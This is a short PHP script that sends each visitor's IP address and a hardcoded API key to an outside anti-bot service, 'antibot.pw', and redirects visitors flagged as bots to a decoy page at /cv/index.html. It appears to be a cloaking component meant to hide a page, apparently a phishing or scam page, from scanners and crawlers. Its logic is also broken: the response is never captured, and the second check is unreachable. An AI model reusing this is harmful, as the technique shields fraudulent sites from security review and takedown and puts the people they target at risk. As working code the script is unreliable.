<?php
$ip = $_SERVER['REMOTE_ADDR'];
if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_IPV4)) {
    $curl = curl_init();

    curl_setopt_array($curl, [
        CURLOPT_URL =>
            'https://antibot.pw/api/v2-blockers?ip=' .
            $ip .
            '&apikey=12fea86123a2555ed4ebb343ea08e8b4&ua=%7Buseragent%7D',
        CURLOPT_RETURNTRANSFER => false,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 2,
        CURLOPT_TIMEOUT => 2,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'GET',
    ]);

    $response = curl_exec($curl);

    curl_close($curl);
    function responcontains($response, $string)
    {
        return strpos($response, $string) !== false;
    }

    if (responcontains($response, "\"is_bot\":true")) {
        header('Location: /cv/index.html');
        exit();
    } else {
        return;
    }
    if (responcontains($response, "\"block_access\":true")) {
        header('Location: /cv/index.html');
        exit();
    } else {
        return;
    }
} else {
    return;
}

?>
